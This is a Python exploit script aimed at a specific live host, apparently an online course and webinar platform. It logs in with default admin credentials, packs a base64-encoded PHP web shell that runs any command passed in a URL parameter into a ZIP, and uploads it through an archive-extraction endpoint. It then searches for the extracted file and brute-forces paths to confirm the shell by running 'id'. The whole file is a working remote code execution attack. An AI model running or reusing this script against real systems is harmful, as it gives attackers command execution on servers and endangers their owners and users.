import requests
import zipfile
import io
import re
import os
import json
import base64
import time
import random
import string

# Target URL
BASE_URL = "http://ccw84s4g4cgsk440c0ssookc.72.62.122.96.sslip.io"
ADMIN_EMAIL = "admin@demo.com"
ADMIN_PASS = "admin"

session = requests.Session()

def login():
    print("[*] Logging in...")
    try:
        r = session.get(f"{BASE_URL}/admin/login")
        csrf_token = re.search(r'name="_token" value="([^"]+)"', r.text).group(1)
        data = {"_token": csrf_token, "email": ADMIN_EMAIL, "password": ADMIN_PASS}
        r = session.post(f"{BASE_URL}/admin/login", data=data)
        if "/admin" in r.url or "/panel" in r.url:
            print("[+] Login Success")
            return True
        return False
    except Exception as e:
        print(f"[-] Login error: {e}")
        return False

def get_csrf(url):
    r = session.get(url)
    match = re.search(r'name="csrf-token" content="([^"]+)"', r.text)
    if match: return match.group(1)
    match = re.search(r'name="_token" value="([^"]+)"', r.text)
    if match: return match.group(1)
    return None

def main():
    if not login():
        print("[-] Login failed.")
        return

    # 1. Scrape webinar from Admin Panel
    r = session.get(f"{BASE_URL}/admin/webinars")
    web_match = re.search(r'/admin/webinars/(\d+)/edit', r.text)
    web_id = web_match.group(1) if web_match else "2009"

    # 2. Find Chapter ID
    r = session.get(f"{BASE_URL}/admin/webinars/{web_id}/edit")
    chapter_match = re.search(r'chapter_id":(\d+)', r.text)
    chap_id = chapter_match.group(1) if chapter_match else "30"
    print(f"[*] Target Webinar: {web_id}, Chapter: {chap_id}")

    # 3. Create shell ZIP with unique name
    rand_name = ''.join(random.choices(string.ascii_lowercase, k=8))
    zip_filename = f"{rand_name}.zip"
    print(f"[*] Using unique ZIP: {zip_filename}")
    
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w') as z:
        # shell: <?php system($_GET["c"]); ?>
        pay = base64.b64decode(" PD9waHAgc3lzdGVtKCRfR0VUWyJjIl0pOyA/Pg==").decode()
        z.writestr('s.php', pay)
    buf.seek(0)

    # 4. Trigger store with File upload via Panel
    csrf = get_csrf(f"{BASE_URL}/panel/courses/{web_id}/edit")
    if not csrf:
        print("[-] CSRF not found.")
        return
        
    print(f"[*] Uploading and triggering extraction...")
    payload = {
        'ajax[new][webinar_id]': web_id,
        'ajax[new][chapter_id]': chap_id,
        'ajax[new][title]': 'Interactive ' + rand_name,
        'ajax[new][accessibility]': 'free',
        'ajax[new][storage]': 'upload_archive',
        'ajax[new][interactive_type]': 'custom',
        'ajax[new][interactive_file_name]': 's.php',
        'ajax[new][status]': 'on',
        '_token': csrf
    }
    files = {'ajax[new][file_upload]': (zip_filename, buf, 'application/zip')}
    
    r = session.post(f"{BASE_URL}/panel/files/store", data=payload, files=files)
    print(f"[*] Post Response: {r.status_code}")
    
    # 5. Scrape the file list to find the actual interactive_file_path
    print("[*] Scrambling for the extracted path...")
    r = session.get(f"{BASE_URL}/panel/courses/{web_id}/edit")
    # Look for the interactive_file_path in the newly created file entry JSON or HTML
    # The response usually includes a list of files in a JS variable or table
    path_match = re.search(r'interactive_file_path":"([^"]+' + rand_name + r'[^"]+)', r.text)
    if not path_match:
         # Try regex for the storage path in general
         path_match = re.search(r'/store/([^/]+)/webinars/' + web_id + r'/files/' + rand_name + r'/s\.php', r.text)
         
    if path_match:
        found_path = path_match.group(1).replace("\\/", "/")
        shell_url = f"{BASE_URL}{found_path}"
        print(f"[+] FOUND POTENTIAL PATH: {shell_url}")
        res = session.get(shell_url + "?c=id")
        if res.status_code == 200 and "uid=" in res.text:
            print(f"[!!!!] SUCCESS! Shell: {shell_url}?c=id")
            print(f"Output: {res.text.strip()}")
            return
    else:
        print("[-] Path not found in edit page. Trying brute force paths again...")

    # Fallback to the known logic but being thorough
    # creator_id/webinars/webinar_id/files/zipname/s.php
    uids = ["1", "2"]
    for uid in uids:
        shell_url = f"{BASE_URL}/store/{uid}/webinars/{web_id}/files/{rand_name}/s.php"
        print(f"[*] Checking {shell_url}...")
        res = session.get(shell_url + "?c=id")
        if res.status_code == 200 and "uid=" in res.text:
             print(f"[!!!!] SUCCESS! Shell: {shell_url}?c=id")
             return

if __name__ == "__main__":
    main()
